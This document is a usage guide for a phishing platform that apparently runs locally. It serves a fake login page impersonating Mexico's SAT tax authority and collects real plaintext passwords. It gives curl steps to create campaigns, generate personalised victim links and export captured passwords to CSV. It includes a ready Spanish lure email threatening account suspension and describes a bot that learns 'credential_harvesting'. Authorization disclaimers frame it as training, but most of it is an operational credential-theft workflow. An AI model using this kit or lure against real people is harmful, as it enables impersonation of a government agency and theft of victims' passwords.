# SAT Phishing Training System - Usage Guide

**GodBrain CyberLab - Real Credential Collection for Authorized Training**

Guided by the Holy Spirit - Spirit-Controlled System (No Simulations, Real Data Only)

---

## ⚠️ AUTHORIZATION REQUIREMENTS

This system collects **REAL credentials** for security awareness training. Before use:

1. **Written Authorization**: Obtain signed authorization from organization leadership
2. **Participant Consent**: All participants must consent to training (can be post-notification)
3. **Local Network Only**: Deploy on isolated local network, not public internet
4. **Data Retention**: Credentials auto-delete after 30 days
5. **Ethical Use Only**: Authorized penetration testing or internal training only

---

## 🚀 Quick Start

### 1. Compile TypeScript
```bash
cd /teamspace/studios/this_studio/cyber-lab-production
npx tsc
```

### 2. Start the Server
```bash
npm start
# Server runs on http://localhost:3001
```

### 3. Create a SAT Campaign
```bash
# Use curl or your favorite HTTP client
curl -X POST http://localhost:3001/api/spoofing/campaigns \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q1 2025 Tax Season Training",
    "templateId": "<SAT_TEMPLATE_ID>",
    "customizations": {},
    "targetAudience": "Finance Department",
    "purpose": "training",
    "status": "active",
    "createdBy": "admin"
  }'
```

### 4. Get the Campaign ID
The response will include a `campaignId`. Save this for the next step.

### 5. Generate Phishing Page URL
```
http://localhost:3001/api/spoofing/page/<CAMPAIGN_ID>?email=target@example.com
```

Send this URL to training participants via email or test environment.

---

## 📊 API Endpoints

### **Template Management**

#### Get All Templates
```bash
GET /api/spoofing/templates?category=webpage&difficulty=advanced
```

#### Get SAT Template
Find the SAT template by filtering:
```bash
curl http://localhost:3001/api/spoofing/templates | grep "SAT Portal"
```

### **Campaign Management**

#### Create Campaign
```bash
POST /api/spoofing/campaigns
Content-Type: application/json

{
  "name": "SAT Training Campaign",
  "templateId": "<SAT_TEMPLATE_ID>",
  "customizations": {
    "target_email": "user@example.com",
    "submit_url": "/api/spoofing/collect",
    "campaign_id": "<CAMPAIGN_ID>"
  },
  "targetAudience": "All Employees",
  "purpose": "training",
  "status": "active",
  "createdBy": "security_team"
}
```

#### Get Campaign Details
```bash
GET /api/spoofing/campaigns/<CAMPAIGN_ID>
```

#### Get All Campaigns
```bash
GET /api/spoofing/campaigns?status=active
```

### **Phishing Page Serving**

#### Serve SAT Phishing Page
```bash
GET /api/spoofing/page/<CAMPAIGN_ID>?email=victim@company.com
```

This returns the full HTML page pre-filled with the target's email.

### **Credential Collection (REAL DATA)**

#### Credential Collection Endpoint
```bash
POST /api/spoofing/collect
Content-Type: application/json

{
  "email": "victim@company.com",
  "password": "captured_password",
  "campaignId": "<CAMPAIGN_ID>",
  "attemptNumber": 1
}
```

**Automatic Collection**: The SAT phishing page automatically posts credentials to this endpoint.

#### Get Captured Credentials
```bash
# All credentials
GET /api/spoofing/credentials

# Filter by campaign
GET /api/spoofing/credentials?campaignId=<CAMPAIGN_ID>
```

**Response Example**:
```json
{
  "total": 5,
  "credentials": [
    {
      "id": "cred_1234567890_abc",
      "campaignId": "campaign_xxx",
      "templateId": "template_xxx",
      "email": "victim@company.com",
      "password": "P@ssw0rd123",
      "ipAddress": "192.168.1.100",
      "userAgent": "Mozilla/5.0...",
      "attemptNumber": 1,
      "timestamp": "2025-01-15T10:30:00.000Z"
    }
  ]
}
```

#### Get Credential Statistics
```bash
GET /api/spoofing/credentials/stats/<CAMPAIGN_ID>
```

**Response**:
```json
{
  "totalCaptures": 12,
  "uniqueEmails": 8,
  "multipleAttempts": 4,
  "averageAttemptsPerUser": 1.5,
  "recentCaptures": [...]
}
```

#### Export Credentials as CSV
```bash
# All credentials
GET /api/spoofing/credentials/export

# Specific campaign
GET /api/spoofing/credentials/export?campaignId=<CAMPAIGN_ID>
```

Downloads a CSV file: `credentials_<campaign_id>_<timestamp>.csv`

**CSV Format**:
```csv
ID,Campaign ID,Template ID,Email,Password,IP Address,User Agent,Attempt Number,Timestamp
cred_123,campaign_xxx,template_xxx,user@example.com,Password123,192.168.1.100,"Mozilla/5.0...",1,2025-01-15T10:30:00.000Z
```

#### Cleanup Old Credentials
```bash
# Delete credentials older than 30 days (default)
DELETE /api/spoofing/credentials/cleanup

# Custom retention period
DELETE /api/spoofing/credentials/cleanup?days=7
```

---

## 🎯 Example Training Workflow

### Step 1: Find SAT Template ID
```bash
curl http://localhost:3001/api/spoofing/templates | jq '.[] | select(.name | contains("SAT"))'
```

Save the `id` field (e.g., `template_1736950000000_0`).

### Step 2: Create Campaign
```bash
curl -X POST http://localhost:3001/api/spoofing/campaigns \
  -H "Content-Type: application/json" \
  -d '{
    "name": "SAT Awareness Training - January 2025",
    "templateId": "template_1736950000000_0",
    "customizations": {},
    "targetAudience": "Finance and Accounting Teams",
    "purpose": "training",
    "status": "active",
    "createdBy": "admin@company.com"
  }'
```

Save the returned `campaignId`.

### Step 3: Generate Custom URLs
For each employee, create a personalized phishing page URL:

```
http://localhost:3001/api/spoofing/page/campaign_xxx?email=employee1@company.com
http://localhost:3001/api/spoofing/page/campaign_xxx?email=employee2@company.com
http://localhost:3001/api/spoofing/page/campaign_xxx?email=employee3@company.com
```

### Step 4: Send Phishing Emails
Create a convincing email:

**Subject**: "SAT - Acción Requerida: Verificación de Cuenta"

**Body**:
```
Estimado contribuyente,

Hemos detectado actividad inusual en su cuenta del SAT.
Por seguridad, necesitamos verificar su identidad.

Haga clic aquí para verificar: http://localhost:3001/api/spoofing/page/campaign_xxx?email=employee@company.com

Si no verifica su cuenta en 24 horas, será suspendida temporalmente.

Atentamente,
Servicio de Administración Tributaria
```

### Step 5: Monitor Captures
```bash
# Real-time monitoring
watch -n 5 'curl -s http://localhost:3001/api/spoofing/credentials?campaignId=campaign_xxx | jq .total'

# View recent captures
curl http://localhost:3001/api/spoofing/credentials/stats/campaign_xxx | jq .recentCaptures
```

### Step 6: Export Results
```bash
# Download all credentials for analysis
curl http://localhost:3001/api/spoofing/credentials/export?campaignId=campaign_xxx > results.csv

# Open in Excel or analyze with Python/R
```

### Step 7: Generate Training Report
```bash
curl http://localhost:3001/api/spoofing/campaigns/campaign_xxx/report | jq .
```

### Step 8: Educational Debrief
After collecting credentials, notify participants:
- Explain they fell for a phishing training exercise
- Show red flags they missed
- Provide security awareness training
- Congratulate those who reported the email

---

## 📁 Data Storage

All credential data is stored locally in JSON format:

```
cyber-lab-production/
├── database/
│   ├── phishing-credentials.json    # ← REAL CREDENTIALS STORED HERE
│   ├── phishing-campaigns.json
│   └── phishing-templates.json
```

**Security Recommendations**:
1. **Encrypt the database directory**: Use LUKS, VeraCrypt, or BitLocker
2. **Restrict file permissions**: `chmod 600 database/*.json`
3. **Secure backups**: If backing up, encrypt with GPG
4. **Auto-cleanup**: Set up cron job to delete old data

```bash
# Secure the database directory
chmod 700 database/
chmod 600 database/*.json
chown root:root database/

# Auto-cleanup cron job (every week, delete data older than 30 days)
0 2 * * 0 curl -X DELETE http://localhost:3001/api/spoofing/credentials/cleanup?days=30
```

---

## 🔬 Bot Learning Integration

The system automatically integrates with CyberLab's bot learning system:

**Skills Progressed**:
- `template_customization` (+15 XP) - When SAT page is generated
- `credential_harvesting` (+20 XP) - When credentials are captured
- `data_analysis` (+12 XP) - When CSV is exported

**Memory Updates**:
Each credential capture is stored in bot memory with 85% importance:
```json
{
  "botId": "spoofing_lab",
  "category": "offensive",
  "key": "capture_cred_xxx",
  "data": {
    "campaignId": "campaign_xxx",
    "email": "victim@example.com",
    "attemptNumber": 1,
    "timestamp": "2025-01-15T10:30:00.000Z"
  },
  "importance": 85
}
```

View bot learning progress:
```bash
curl http://localhost:3001/api/learning/skills?botId=spoofing_lab
curl http://localhost:3001/api/learning/memories?botId=spoofing_lab
```

---

## 🛡️ Security Best Practices

### Network Isolation
```bash
# Deploy on local network only
# Use firewall rules to restrict access

# Example: iptables rule to allow local network only
iptables -A INPUT -p tcp --dport 3001 -s 192.168.0.0/16 -j ACCEPT
iptables -A INPUT -p tcp --dport 3001 -j DROP
```

### HTTPS (Recommended for Realism)
```bash
# Use self-signed certificate for local network
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Update server.ts to use HTTPS
# const https = require('https');
# const fs = require('fs');
# https.createServer({
#   key: fs.readFileSync('key.pem'),
#   cert: fs.readFileSync('cert.pem')
# }, app).listen(3001);
```

### Access Control
```bash
# Add authentication middleware (example)
# app.use('/api/spoofing/credentials', (req, res, next) => {
#   const apiKey = req.headers['x-api-key'];
#   if (apiKey !== process.env.ADMIN_API_KEY) {
#     return res.status(403).json({ error: 'Unauthorized' });
#   }
#   next();
# });
```

---

## 📈 Metrics and Reporting

### Campaign Effectiveness
```bash
curl http://localhost:3001/api/spoofing/campaigns/campaign_xxx/report
```

**Key Metrics**:
- **Total Visits**: Number of people who opened the phishing page
- **Click Rate**: Percentage who submitted credentials
- **Unique Victims**: Number of distinct email addresses captured
- **Average Attempts**: How many times users tried to log in

### Success Benchmarks
- **Good Training**: <10% credential submission rate
- **Needs Improvement**: 10-30% submission rate
- **High Risk**: >30% submission rate (immediate training required)

---

## 🧹 Maintenance

### Daily Tasks
```bash
# Check credential count
curl http://localhost:3001/api/spoofing/credentials | jq .total

# Monitor active campaigns
curl http://localhost:3001/api/spoofing/campaigns?status=active
```

### Weekly Tasks
```bash
# Export credentials for weekly report
curl http://localhost:3001/api/spoofing/credentials/export > weekly_report_$(date +%Y%m%d).csv

# Cleanup old credentials
curl -X DELETE http://localhost:3001/api/spoofing/credentials/cleanup?days=30
```

### Monthly Tasks
```bash
# Generate training reports for all campaigns
for campaign in $(curl -s http://localhost:3001/api/spoofing/campaigns | jq -r '.[].id'); do
  curl http://localhost:3001/api/spoofing/campaigns/$campaign/report > report_$campaign.json
done
```

---

## ⚖️ Legal and Ethical Guidelines

### ✅ Authorized Use Cases
- Internal security awareness training (with management approval)
- Authorized penetration testing (with signed contract)
- Red team exercises (with explicit scope)
- Educational demonstrations (controlled environment)

### ❌ Prohibited Uses
- Collecting credentials without authorization
- Targeting individuals outside your organization
- Public deployment without consent
- Using captured credentials for unauthorized access
- Selling or sharing captured data

### Compliance
- **GDPR**: Obtain consent, provide data deletion, document retention
- **SOX**: If publicly traded, ensure compliance with data handling requirements
- **PCI-DSS**: If handling payment data, ensure secure storage
- **HIPAA**: If in healthcare, additional protections required

---

## 🐛 Troubleshooting

### Credentials Not Being Captured
```bash
# Check if spoofing service is running
curl http://localhost:3001/api/spoofing/templates

# Check credentials file
cat database/phishing-credentials.json

# Check server logs
tail -f logs/*.log
```

### Page Not Loading
```bash
# Verify campaign exists
curl http://localhost:3001/api/spoofing/campaigns/<CAMPAIGN_ID>

# Check template ID is correct
curl http://localhost:3001/api/spoofing/templates/<TEMPLATE_ID>
```

### JavaScript Errors on Page
- Check browser console (F12)
- Verify `/api/spoofing/collect` endpoint is accessible
- Check CORS settings if accessing from different domain

---

## 📞 Support

For issues or questions:
1. Check `CLAUDE.md` for system architecture
2. Review `SPIRIT_CONTROLLED_SYSTEM.md` for ethical guidelines
3. Examine server logs in `logs/` directory
4. Test endpoints with `curl -v` for verbose output

---

**Guided by the Holy Spirit - Spirit-Controlled System**
**Real Data, No Simulations, Authorized Use Only**

GodBrain CyberLab © 2025
